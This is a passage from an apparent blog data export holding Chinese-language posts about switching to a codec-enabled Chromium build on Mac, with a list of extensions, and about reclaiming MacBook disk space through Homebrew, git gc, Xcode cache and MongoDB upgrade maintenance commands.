列出我所使用的扩展列表（按照字母排序）：\n\n## 1. cVim\n\n可以仿照 Vim 的快捷键来进行网页浏览。\n\n## 2. HTTPS Everywhere\n\n自动访问加密版本的网址。\n\n## 3. LastPass\n\n密码管理。\n\n## 4. Proxy SwitchyOmega\n\n自动翻墙代理。\n\n## 5. Save to Pocket\n\n保存网页到 Pocket。\n\n## 6. Tampermonkey\n\n油猴子脚本插件。\n\n## 7. uBlock Origin\n\n屏蔽广告。\n\n## 8. uMatrix\n\n屏蔽网页内容和脚本。\n","slug":"Chromium-for-Mac","published":1,"comments":1,"layout":"post","photos":[],"_id":"clypxqmme0003xrn5csz3h334","content":"<p>最开始我一直是 Firefox 党，也简单写过了几篇关于 Firefox 使用的文章，例如<a href=\"/2017/11/26/Firefox57/\">《Firefox57新版试用》</a>，但是后来发现 Firefox 在 Mac 上经常性的出现风扇狂转的现象，因此不得不转移到了 Chrome 上，所幸两者的丰富插件使得使用体验上基本一致。但是近几年 Chrome 的隐私问题越来越严重，我也不得不对持续使用 Chrome 打上了问号。因此想着能否使用 Chromium 来替代。</p>\n<h1 id=\"Chromium-介绍\"><a href=\"#Chromium-介绍\" class=\"headerlink\" title=\"Chromium 介绍\"></a>Chromium 介绍</h1><p>众所周知，Chrome 是谷歌开发的一个网页浏览器，但是这个浏览器也不是完全从零开始的，而是采用了大量的开源代码，最重要的部分就是苹果的 Webkit，谷歌也开源了大量 Chrome 相关的源码回馈到开源社区，著名的 NodeJS 就是基于谷歌开源的 V8 Javascript 解释引擎实现的的。基于谷歌的 Chrome 开源代码内容，编译得到的就是 Chromium。</p>\n<p>相比 Chrome，Chromium 缺少了某些闭源的二进制代码，比如 Flash 插件，商业解码器等，也不会有任何谷歌的标识，因此国内的浏览器厂商也都选择基于 Chromium 来作为他们自己浏览器的内核。</p>\n<p>正如上文所说，Chromium 中缺乏了部分闭源代码，对此主要是有两方面的影响，第一是很多 Chrome 自带的服务都无法使用，这个恰恰是我们所希望的，缺乏谷歌的服务能够大幅提升隐私性；第二个影响则是缺乏视频解码，这个则会对我们平时的网页浏览带来非常大的影响。因此默认 Chromium 官网提供的并不能实际使用，而我选择的是开发者 marmaduke 编译的带有解码器的版本。关于 Chromium 可用版本的列表可以参考网页 <a href=\"https://chromium.woolyss.com/%EF%BC%8C%E8%AF%A5%E9%A1%B5%E9%9D%A2%E6%8F%90%E4%BE%9B%E4%BA%86%E8%87%B4%E5%91%BD%E7%9A%84%E7%AC%AC%E4%B8%89%E6%96%B9%E7%BC%96%E8%AF%91\">https://chromium.woolyss.com/，该页面提供了致命的第三方编译</a> Chromium 列表，可以自行选用。</p>\n<p>最终，我选择了自带解码器的 marmaduke 编译的 Chromium，值得注意的是，该作者提供了三个版本的 Chromium 分别是。</p>\n<ul>\n<li>marmaduke-chromium 最基础的版本，猜测应该是标准 Chromium 外加视频解码器</li>\n<li>marmaduke-chromium-nosync 去除了 Chromium 中的 Google Sync 和 Widevine（一种加密视频协议）。</li>\n<li>marmaduke-chromium-ungoogled 更为激进的一个版本，去除了谷歌的同步，各种服务，以及相关的二进制文件，同时也带来了一些安全上的改进，具体的内容可以参考 <a href=\"https://github.com/Eloston/ungoogled-chromium/blob/master/README.md\">UNGOOGLED Chromium</a>，注意这个版本无法从 Chrome Webstore 下载和更新扩展程序。</li>\n</ul>\n<p>唯一要注意的是上述三个不可以同时安装，简单挑选一个即可，在 Mac 上的具体安装步骤如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew tap cpbotha/marmaduke-chromium</span><br><span class=\"line\">brew cask install marmaduke-chromium</span><br><span class=\"line\">brew cask install marmaduke-chromium-nosync</span><br><span class=\"line\">brew cask install marmaduke-chromium-ungoogled</span><br></pre></td></tr></table></figure>\n\n<p>至于我的个人选择，本来是想优先选用 marmaduke-chromium-ungoogled，但是因为扩展程序更新不方便，还是退而求其次选择 marmaduke-chromium 吧。</p>\n<h1 id=\"扩展持续列表\"><a href=\"#扩展持续列表\" class=\"headerlink\" title=\"扩展持续列表\"></a>扩展持续列表</h1><p>最后，仍然仿照 Firefox 列出我所使用的扩展列表（按照字母排序）：</p>\n<h2 id=\"1-cVim\"><a href=\"#1-cVim\" class=\"headerlink\" title=\"1. cVim\"></a>1. cVim</h2><p>可以仿照 Vim 的快捷键来进行网页浏览。</p>\n<h2 id=\"2-HTTPS-Everywhere\"><a href=\"#2-HTTPS-Everywhere\" class=\"headerlink\" title=\"2. HTTPS Everywhere\"></a>2. HTTPS Everywhere</h2><p>自动访问加密版本的网址。</p>\n<h2 id=\"3-LastPass\"><a href=\"#3-LastPass\" class=\"headerlink\" title=\"3. LastPass\"></a>3. LastPass</h2><p>密码管理。</p>\n<h2 id=\"4-Proxy-SwitchyOmega\"><a href=\"#4-Proxy-SwitchyOmega\" class=\"headerlink\" title=\"4. Proxy SwitchyOmega\"></a>4. Proxy SwitchyOmega</h2><p>自动翻墙代理。</p>\n<h2 id=\"5-Save-to-Pocket\"><a href=\"#5-Save-to-Pocket\" class=\"headerlink\" title=\"5. Save to Pocket\"></a>5. Save to Pocket</h2><p>保存网页到 Pocket。</p>\n<h2 id=\"6-Tampermonkey\"><a href=\"#6-Tampermonkey\" class=\"headerlink\" title=\"6. Tampermonkey\"></a>6. Tampermonkey</h2><p>油猴子脚本插件。</p>\n<h2 id=\"7-uBlock-Origin\"><a href=\"#7-uBlock-Origin\" class=\"headerlink\" title=\"7. uBlock Origin\"></a>7. uBlock Origin</h2><p>屏蔽广告。</p>\n<h2 id=\"8-uMatrix\"><a href=\"#8-uMatrix\" class=\"headerlink\" title=\"8. uMatrix\"></a>8. uMatrix</h2><p>屏蔽网页内容和脚本。</p>\n","excerpt":"","more":"<p>最开始我一直是 Firefox 党，也简单写过了几篇关于 Firefox 使用的文章，例如<a href=\"/2017/11/26/Firefox57/\">《Firefox57新版试用》</a>，但是后来发现 Firefox 在 Mac 上经常性的出现风扇狂转的现象，因此不得不转移到了 Chrome 上，所幸两者的丰富插件使得使用体验上基本一致。但是近几年 Chrome 的隐私问题越来越严重，我也不得不对持续使用 Chrome 打上了问号。因此想着能否使用 Chromium 来替代。</p>\n<h1 id=\"Chromium-介绍\"><a href=\"#Chromium-介绍\" class=\"headerlink\" title=\"Chromium 介绍\"></a>Chromium 介绍</h1><p>众所周知，Chrome 是谷歌开发的一个网页浏览器，但是这个浏览器也不是完全从零开始的，而是采用了大量的开源代码，最重要的部分就是苹果的 Webkit，谷歌也开源了大量 Chrome 相关的源码回馈到开源社区，著名的 NodeJS 就是基于谷歌开源的 V8 Javascript 解释引擎实现的的。基于谷歌的 Chrome 开源代码内容，编译得到的就是 Chromium。</p>\n<p>相比 Chrome，Chromium 缺少了某些闭源的二进制代码，比如 Flash 插件，商业解码器等，也不会有任何谷歌的标识，因此国内的浏览器厂商也都选择基于 Chromium 来作为他们自己浏览器的内核。</p>\n<p>正如上文所说，Chromium 中缺乏了部分闭源代码，对此主要是有两方面的影响，第一是很多 Chrome 自带的服务都无法使用，这个恰恰是我们所希望的，缺乏谷歌的服务能够大幅提升隐私性；第二个影响则是缺乏视频解码，这个则会对我们平时的网页浏览带来非常大的影响。因此默认 Chromium 官网提供的并不能实际使用，而我选择的是开发者 marmaduke 编译的带有解码器的版本。关于 Chromium 可用版本的列表可以参考网页 <a href=\"https://chromium.woolyss.com/%EF%BC%8C%E8%AF%A5%E9%A1%B5%E9%9D%A2%E6%8F%90%E4%BE%9B%E4%BA%86%E8%87%B4%E5%91%BD%E7%9A%84%E7%AC%AC%E4%B8%89%E6%96%B9%E7%BC%96%E8%AF%91\">https://chromium.woolyss.com/，该页面提供了致命的第三方编译</a> Chromium 列表，可以自行选用。</p>\n<p>最终，我选择了自带解码器的 marmaduke 编译的 Chromium，值得注意的是，该作者提供了三个版本的 Chromium 分别是。</p>\n<ul>\n<li>marmaduke-chromium 最基础的版本，猜测应该是标准 Chromium 外加视频解码器</li>\n<li>marmaduke-chromium-nosync 去除了 Chromium 中的 Google Sync 和 Widevine（一种加密视频协议）。</li>\n<li>marmaduke-chromium-ungoogled 更为激进的一个版本，去除了谷歌的同步，各种服务，以及相关的二进制文件，同时也带来了一些安全上的改进，具体的内容可以参考 <a href=\"https://github.com/Eloston/ungoogled-chromium/blob/master/README.md\">UNGOOGLED Chromium</a>，注意这个版本无法从 Chrome Webstore 下载和更新扩展程序。</li>\n</ul>\n<p>唯一要注意的是上述三个不可以同时安装，简单挑选一个即可，在 Mac 上的具体安装步骤如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew tap cpbotha/marmaduke-chromium</span><br><span class=\"line\">brew cask install marmaduke-chromium</span><br><span class=\"line\">brew cask install marmaduke-chromium-nosync</span><br><span class=\"line\">brew cask install marmaduke-chromium-ungoogled</span><br></pre></td></tr></table></figure>\n\n<p>至于我的个人选择，本来是想优先选用 marmaduke-chromium-ungoogled，但是因为扩展程序更新不方便，还是退而求其次选择 marmaduke-chromium 吧。</p>\n<h1 id=\"扩展持续列表\"><a href=\"#扩展持续列表\" class=\"headerlink\" title=\"扩展持续列表\"></a>扩展持续列表</h1><p>最后，仍然仿照 Firefox 列出我所使用的扩展列表（按照字母排序）：</p>\n<h2 id=\"1-cVim\"><a href=\"#1-cVim\" class=\"headerlink\" title=\"1. cVim\"></a>1. cVim</h2><p>可以仿照 Vim 的快捷键来进行网页浏览。</p>\n<h2 id=\"2-HTTPS-Everywhere\"><a href=\"#2-HTTPS-Everywhere\" class=\"headerlink\" title=\"2. HTTPS Everywhere\"></a>2. HTTPS Everywhere</h2><p>自动访问加密版本的网址。</p>\n<h2 id=\"3-LastPass\"><a href=\"#3-LastPass\" class=\"headerlink\" title=\"3. LastPass\"></a>3. LastPass</h2><p>密码管理。</p>\n<h2 id=\"4-Proxy-SwitchyOmega\"><a href=\"#4-Proxy-SwitchyOmega\" class=\"headerlink\" title=\"4. Proxy SwitchyOmega\"></a>4. Proxy SwitchyOmega</h2><p>自动翻墙代理。</p>\n<h2 id=\"5-Save-to-Pocket\"><a href=\"#5-Save-to-Pocket\" class=\"headerlink\" title=\"5. Save to Pocket\"></a>5. Save to Pocket</h2><p>保存网页到 Pocket。</p>\n<h2 id=\"6-Tampermonkey\"><a href=\"#6-Tampermonkey\" class=\"headerlink\" title=\"6. Tampermonkey\"></a>6. Tampermonkey</h2><p>油猴子脚本插件。</p>\n<h2 id=\"7-uBlock-Origin\"><a href=\"#7-uBlock-Origin\" class=\"headerlink\" title=\"7. uBlock Origin\"></a>7. uBlock Origin</h2><p>屏蔽广告。</p>\n<h2 id=\"8-uMatrix\"><a href=\"#8-uMatrix\" class=\"headerlink\" title=\"8. uMatrix\"></a>8. uMatrix</h2><p>屏蔽网页内容和脚本。</p>\n"},{"title":"清理 Macbook 磁盘空间","date":"2018-12-21T21:44:23.000Z","updated":"2018-12-22T21:52:15.000Z","_content":"\n# 清理 Macbook 磁盘空间\n\n因为当初买的是丐版 Macbook，因此经常面临磁盘空间告警的情况，所以\n\n## 查看目录大小\n\n推荐使用 OmniDiskSweeper，`brew cask install omnidisksweeper`。打开后点击当前磁盘，进入后等待一段时间就能看到各个目录的占用空间大小，也可以逐一点进去看到子目录的大小。\n\n## Homebrew 的清理\n\n平时更新 Homebrew 时，及时进行 cleanup 操作，或者直接使用命令 `brew update && brew upgrade && brew cleanup`，这样就能够及时清理掉旧的软件版本。\n\n此外，随着使用时间的增长，Homebrew 的 git 文件夹也会变的越来越大，因此可以通过 `git gc` 指令来整理 git 文件夹。这个原理是平时每次更新 git 都会下载各种更新文件，而这些文件会在磁盘保存为一种称作松散对象 (loose object) 格式，通过运行 `gc` 指令，git 会将这些平时零散存储的文件对象打包至一个叫 packfile 的二进制文件以节省空间并提高效率。如果时间长了，则有可能缩减几十万个文件。\n\n![清理 Homebrew 的效果](/img/cleanmac.png)\n\n为了能够自动清理，我编写了如下的脚本，以后定期执行即可。\n\n```\n#!/bin/sh\n\ncd \"$(brew --repo)\" && git gc --prune=now\n\nroot=\"$(brew --repo)/Library/Taps/homebrew/\"\n\necho $root\nfor d in `ls $root`\ndo\n    echo \" clean $root$d ...\"\n    cd $root$d && git gc --prune=now\ndone\n\nroot=\"$(brew --repo)/Library/Taps/caskroom/\"\necho $root\nfor d in `ls $root`\ndo\n    echo \" clean $root$d ...\"\n    cd $root$d && git gc --prune=now\ndone\n```\n\n## Xcode 清理\n\nXcode 会下载大量的文件，但是过了一段时间后，仍然会有旧版本设备的支持，所以需要清理如下文件夹：\n\n```\n~/Library/Developer/Xcode/DerivedData\n~/Library/Developer/Xcode/Archives\n~/Library/Developer/Xcode/iOS DeviceSupport\n~/Library/Developer/Xcode/watchOS DeviceSupport\n~/Library/Developer/CoreSimulator \n```\n\n## MongoDB 清理\n\n长久未使用 MongoDB，发现随着版本升级，对应的数据库文件没有升级，因此已经无法正常使用了，而 journal 日志则占用了将近 1G 空间，因此不得不先对数据库文件进行升级。通过 MongoDB 的启动日志可以知道，需要先从 3.4 升级到 3.6 再升级到 4.0。具体的脚本内容如下：\n\n```\nbrew install mongodb@3.4\nbrew services start mongodb@3.4\n/usr/local/opt/mongodb@3.4/bin/mongo\n> db.adminCommand( { setFeatureCompatibilityVersion: \"3.4\" } )\nbrew uninstall mongodb@3.4\n\n// 安装 MongoDB 3.6\nbrew services start mongodb@3.6\n/usr/local/opt/mongodb@3.6/bin/mongo\n> db.adminCommand( { setFeatureCompatibilityVersion: \"3.6\" } )\nbrew services stop mongodb@3.6\nbrew uninstall mongodb@3.6\n\n// 安装 MongoDB 4\nbrew install mongodb\nbrew services start mongodb\n```\n\n升级完毕后，发现存储引擎仍然为 MMAPV1，需要升级为 wiredTiger，因此我在导出数据库后，删除数据库文件夹后又重装了 MongoDB 再导入数据，数据库占用空间也瞬时缩减了一大半。\n\n```\nmongodump --out mongodb\nbrew uninstall mongodb\nrm -rf /usr/local/var/mongodb\nbrew install mongodb\nbrew services start mongodb\nmongorestore mongodb\n```\n\n## 引用\n[为什么你的 Git 仓库变得如此臃肿](https://www.jianshu.com/p/7231b509c279)\n[Can I delete data from iOS DeviceSupport?](https://stackoverflow.com/questions/29930198/can-i-delete-data-from-ios-devicesupport/29931912)","source":"_posts/Clean-macbook.md","raw":"title: 清理 Macbook 磁盘空间\ndate: 2018-12-21 21:44:23\nupdated: 2018-12-22 21:52:15\ntags:\n---\n\n# 清理 Macbook 磁盘空间\n\n因为当初买的是丐版 Macbook，因此经常面临磁盘空间告警的情况，所以\n\n## 查看目录大小\n\n推荐使用 OmniDiskSweeper，`brew cask install omnidisksweeper`。打开后点击当前磁盘，进入后等待一段时间就能看到各个目录的占用空间大小，也可以逐一点进去看到子目录的大小。\n\n## Homebrew 的清理\n\n平时更新 Homebrew 时，及时进行 cleanup 操作，或者直接使用命令 `brew update && brew upgrade && brew cleanup`，这样就能够及时清理掉旧的软件版本。\n\n此外，随着使用时间的增长，Homebrew 的 git 文件夹也会变的越来越大，因此可以通过 `git gc` 指令来整理 git 文件夹。这个原理是平时每次更新 git 都会下载各种更新文件，而这些文件会在磁盘保存为一种称作松散对象 (loose object) 格式，通过运行 `gc` 指令，git 会将这些平时零散存储的文件对象打包至一个叫 packfile 的二进制文件以节省空间并提高效率。如果时间长了，则有可能缩减几十万个文件。\n\n![清理 Homebrew 的效果](/img/cleanmac.png)\n\n为了能够自动清理，我编写了如下的脚本，以后定期执行即可。\n\n```\n#!/bin/sh\n\ncd \"$(brew --repo)\" && git gc --prune=now\n\nroot=\"$(brew --repo)/Library/Taps/homebrew/\"\n\necho $root\nfor d in `ls $root`\ndo\n    echo \" clean $root$d ...\"\n    cd $root$d && git gc --prune=now\ndone\n\nroot=\"$(brew --repo)/Library/Taps/caskroom/\"\necho $root\nfor d in `ls $root`\ndo\n    echo \" clean $root$d ...\"\n    cd $root$d && git gc --prune=now\ndone\n```\n\n## Xcode 清理\n\nXcode 会下载大量的文件，但是过了一段时间后，仍然会有旧版本设备的支持，所以需要清理如下文件夹：\n\n```\n~/Library/Developer/Xcode/DerivedData\n~/Library/Developer/Xcode/Archives\n~/Library/Developer/Xcode/iOS DeviceSupport\n~/Library/Developer/Xcode/watchOS DeviceSupport\n~/Library/Developer/CoreSimulator \n```\n\n## MongoDB 清理\n\n长久未使用 MongoDB，发现随着版本升级，对应的数据库文件没有升级，因此已经无法正常使用了，而 journal 日志则占用了将近 1G 空间，因此不得不先对数据库文件进行升级。通过 MongoDB 的启动日志可以知道，需要先从 3.4 升级到 3.6 再升级到 4.0。具体的脚本内容如下：\n\n```\nbrew install mongodb@3.4\nbrew services start mongodb@3.4\n/usr/local/opt/mongodb@3.4/bin/mongo\n> db.adminCommand( { setFeatureCompatibilityVersion: \"3.4\" } )\nbrew uninstall mongodb@3.4\n\n// 安装 MongoDB 3.6\nbrew services start mongodb@3.6\n/usr/local/opt/mongodb@3.6/bin/mongo\n> db.adminCommand( { setFeatureCompatibilityVersion: \"3.6\" } )\nbrew services stop mongodb@3.6\nbrew uninstall mongodb@3.6\n\n// 安装 MongoDB 4\nbrew install mongodb\nbrew services start mongodb\n```\n\n升级完毕后，发现存储引擎仍然为 MMAPV1，需要升级为 wiredTiger，因此我在导出数据库后，删除数据库文件夹后又重装了 MongoDB 再导入数据，数据库占用空间也瞬时缩减了一大半。\n\n```\nmongodump --out mongodb\nbrew uninstall mongodb\nrm -rf /usr/local/var/mongodb\nbrew install mongodb\nbrew services start mongodb\nmongorestore mongodb\n```\n\n## 引用\n[为什么你的 Git 仓库变得如此臃肿](https://www.jianshu.com/p/7231b509c279)\n[Can I delete data from iOS DeviceSupport?](https://stackoverflow.com/questions/29930198/can-i-delete-data-from-ios-devicesupport/29931912)","slug":"Clean-macbook","published":1,"comments":1,"layout":"post","photos":[],"_id":"clypxqmmg0004xrn551go9gmr","content":"<h1 id=\"清理-Macbook-磁盘空间\"><a href=\"#清理-Macbook-磁盘空间\" class=\"headerlink\" title=\"清理 Macbook 磁盘空间\"></a>清理 Macbook 磁盘空间</h1><p>因为当初买的是丐版 Macbook，因此经常面临磁盘空间告警的情况，所以</p>\n<h2 id=\"查看目录大小\"><a href=\"#查看目录大小\" class=\"headerlink\" title=\"查看目录大小\"></a>查看目录大小</h2><p>推荐使用 OmniDiskSweeper，<code>brew cask install omnidisksweeper</code>。打开后点击当前磁盘，进入后等待一段时间就能看到各个目录的占用空间大小，也可以逐一点进去看到子目录的大小。</p>\n<h2 id=\"Homebrew-的清理\"><a href=\"#Homebrew-的清理\" class=\"headerlink\" title=\"Homebrew 的清理\"></a>Homebrew 的清理</h2><p>平时更新 Homebrew 时，及时进行 cleanup 操作，或者直接使用命令 <code>brew update &amp;&amp; brew upgrade &amp;&amp; brew cleanup</code>，这样就能够及时清理掉旧的软件版本。</p>\n<p>此外，随着使用时间的增长，Homebrew 的 git 文件夹也会变的越来越大，因此可以通过 <code>git gc</code> 指令来整理 git 文件夹。这个原理是平时每次更新 git 都会下载各种更新文件，而这些文件会在磁盘保存为一种称作松散对象 (loose object) 格式，通过运行 <code>gc</code> 指令，git 会将这些平时零散存储的文件对象打包至一个叫 packfile 的二进制文件以节省空间并提高效率。如果时间长了，则有可能缩减几十万个文件。</p>\n<p><img src=\"/img/cleanmac.png\" alt=\"清理 Homebrew 的效果\"></p>\n<p>为了能够自动清理，我编写了如下的脚本，以后定期执行即可。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/sh</span><br><span class=\"line\"></span><br><span class=\"line\">cd &quot;$(brew --repo)&quot; &amp;&amp; git gc --prune=now</span><br><span class=\"line\"></span><br><span class=\"line\">root=&quot;$(brew --repo)/Library/Taps/homebrew/&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">echo $root</span><br><span class=\"line\">for d in `ls $root`</span><br><span class=\"line\">do</span><br><span class=\"line\">    echo &quot; clean $root$d ...&quot;</span><br><span class=\"line\">    cd $root$d &amp;&amp; git gc --prune=now</span><br><span class=\"line\">done</span><br><span class=\"line\"></span><br><span class=\"line\">root=&quot;$(brew --repo)/Library/Taps/caskroom/&quot;</span><br><span class=\"line\">echo $root</span><br><span class=\"line\">for d in `ls $root`</span><br><span class=\"line\">do</span><br><span class=\"line\">    echo &quot; clean $root$d ...&quot;</span><br><span class=\"line\">    cd $root$d &amp;&amp; git gc --prune=now</span><br><span class=\"line\">done</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Xcode-清理\"><a href=\"#Xcode-清理\" class=\"headerlink\" title=\"Xcode 清理\"></a>Xcode 清理</h2><p>Xcode 会下载大量的文件，但是过了一段时间后，仍然会有旧版本设备的支持，所以需要清理如下文件夹：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">~/Library/Developer/Xcode/DerivedData</span><br><span class=\"line\">~/Library/Developer/Xcode/Archives</span><br><span class=\"line\">~/Library/Developer/Xcode/iOS DeviceSupport</span><br><span class=\"line\">~/Library/Developer/Xcode/watchOS DeviceSupport</span><br><span class=\"line\">~/Library/Developer/CoreSimulator </span><br></pre></td></tr></table></figure>\n\n<h2 id=\"MongoDB-清理\"><a href=\"#MongoDB-清理\" class=\"headerlink\" title=\"MongoDB 清理\"></a>MongoDB 清理</h2><p>长久未使用 MongoDB，发现随着版本升级，对应的数据库文件没有升级，因此已经无法正常使用了，而 journal 日志则占用了将近 1G 空间，因此不得不先对数据库文件进行升级。通过 MongoDB 的启动日志可以知道，需要先从 3.4 升级到 3.6 再升级到 4.0。具体的脚本内容如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install mongodb@3.4</span><br><span class=\"line\">brew services start mongodb@3.4</span><br><span class=\"line\">/usr/local/opt/mongodb@3.4/bin/mongo</span><br><span class=\"line\">&gt; db.adminCommand( &#123; setFeatureCompatibilityVersion: &quot;3.4&quot; &#125; )</span><br><span class=\"line\">brew uninstall mongodb@3.4</span><br><span class=\"line\"></span><br><span class=\"line\">// 安装 MongoDB 3.6</span><br><span class=\"line\">brew services start mongodb@3.6</span><br><span class=\"line\">/usr/local/opt/mongodb@3.6/bin/mongo</span><br><span class=\"line\">&gt; db.adminCommand( &#123; setFeatureCompatibilityVersion: &quot;3.6&quot; &#125; )</span><br><span class=\"line\">brew services stop mongodb@3.6</span><br><span class=\"line\">brew uninstall mongodb@3.6</span><br><span class=\"line\"></span><br><span class=\"line\">// 安装 MongoDB 4</span><br><span class=\"line\">brew install mongodb</span><br><span class=\"line\">brew services start mongodb</span><br></pre></td></tr></table></figure>\n\n<p>升级完毕后，发现存储引擎仍然为 MMAPV1，需要升级为 wiredTiger，因此我在导出数据库后，删除数据库文件夹后又重装了 MongoDB 再导入数据，数据库占用空间也瞬时缩减了一大半。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mongodump --out mongodb</span><br><span class=\"line\">brew uninstall mongodb</span><br><span class=\"line\">rm -rf /usr/local/var/mongodb</span><br><span class=\"line\">brew install mongodb</span><br><span class=\"line\">brew services start mongodb</span><br><span class=\"line\">mongorestore mongodb</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"引用\"><a href=\"#引用\" class=\"headerlink\" title=\"引用\"></a>引用</h2><p><a href=\"https://www.jianshu.com/p/7231b509c279\">为什么你的 Git 仓库变得如此臃肿</a><br><a href=\"https://stackoverflow.com/questions/29930198/can-i-delete-data-from-ios-devicesupport/29931912\">Can I delete data from iOS DeviceSupport?</a></p>\n","excerpt":"","more":"<h1 id=\"清理-Macbook-磁盘空间\"><a href=\"#清理-Macbook-磁盘空间\" class=\"headerlink\" title=\"清理 Macbook 磁盘空间\"></a>清理 Macbook 磁盘空间</h1><p>因为当初买的是丐版 Macbook，因此经常面临磁盘空间告警的情况，所以</p>\n<h2 id=\"查看目录大小\"><a href=\"#查看目录大小\" class=\"headerlink\" title=\"查看目录大小\"></a>查看目录大小</h2><p>推荐使用 OmniDiskSweeper，<code>brew cask install omnidisksweeper</code>。打开后点击当前磁盘，进入后等待一段时间就能看到各个目录的占用空间大小，也可以逐一点进去看到子目录的大小。</p>\n<h2 id=\"Homebrew-的清理\"><a href=\"#Homebrew-的清理\" class=\"headerlink\" title=\"Homebrew 的清理\"></a>Homebrew 的清理</h2><p>平时更新 Homebrew 时，及时进行 cleanup 操作，或者直接使用命令 <code>brew update &amp;&amp; brew upgrade &amp;&amp; brew cleanup</code>，这样就能够及时清理掉旧的软件版本。</p>\n<p>此外，随着使用时间的增长，Homebrew 的 git 文件夹也会变的越来越大，因此可以通过 <code>git gc</code> 指令来整理 git 文件夹。这个原理是平时每次更新 git 都会下载各种更新文件，而这些文件会在磁盘保存为一种称作松散对象 (loose object) 格式，通过运行 <code>gc</code> 指令，git 会将这些平时零散存储的文件对象打包至一个叫 packfile 的二进制文件以节省空间并提高效率。如果时间长了，则有可能缩减几十万个文件。</p>\n<p><img src=\"/img/cleanmac.png\" alt=\"清理 Homebrew 的效果\"></p>\n<p>为了能够自动清理，我编写了如下的脚本，以后定期执行即可。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/sh</span><br><span class=\"line\"></span><br><span class=\"line\">cd &quot;$(brew --repo)&quot; &amp;&amp; git gc --prune=now</span><br><span class=\"line\"></span><br><span class=\"line\">root=&quot;$(brew --repo)/Library/Taps/homebrew/&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">echo $root</span><br><span class=\"line\">for d in `ls $root`</span><br><span class=\"line\">do</span><br><span class=\"line\">    echo &quot; clean $root$d ...&quot;</span><br><span class=\"line\">    cd $root$d &amp;&amp; git gc --prune=now</span><br><span class=\"line\">done</span><br><span class=\"line\"></span><br><span class=\"line\">root=&quot;$(brew --repo)/Library/Taps/caskroom/&quot;</span><br><span class=\"line\">echo $root</span><br><span class=\"line\">for d in `ls $root`</span><br><span class=\"line\">do</span><br><span class=\"line\">    echo &quot; clean $root$d ...&quot;</span><br><span class=\"line\">    cd $root$d &amp;&amp; git gc --prune=now</span><br><span class=\"line\">done</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Xcode-清理\"><a href=\"#Xcode-清理\" class=\"headerlink\" title=\"Xcode 清理\"></a>Xcode 清理</h2><p>Xcode 会下载大量的文件，但是过了一段时间后，仍然会有旧版本设备的支持，所以需要清理如下文件夹：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">~/Library/Developer/Xcode/DerivedData</span><br><span class=\"line\">~/Library/Developer/Xcode/Archives</span><br><span class=\"line\">~/Library/Developer/Xcode/iOS DeviceSupport</span><br><span class=\"line\">~/Library/Developer/Xcode/watchOS DeviceSupport</span><br><span class=\"line\">~/Library/Developer/CoreSimulator </span><br></pre></td></tr></table></figure>\n\n<h2 id=\"MongoDB-清理\"><a href=\"#MongoDB-清理\" class=\"headerlink\" title=\"MongoDB 清理\"></a>MongoDB 清理</h2><p>长久未使用 MongoDB，发现随着版本升级，对应的数据库文件没有升级，因此已经无法正常使用了，而 journal 日志则占用了将近 1G 空间，因此不得不先对数据库文件进行升级。通过 MongoDB 的启动日志可以知道，需要先从 3.4 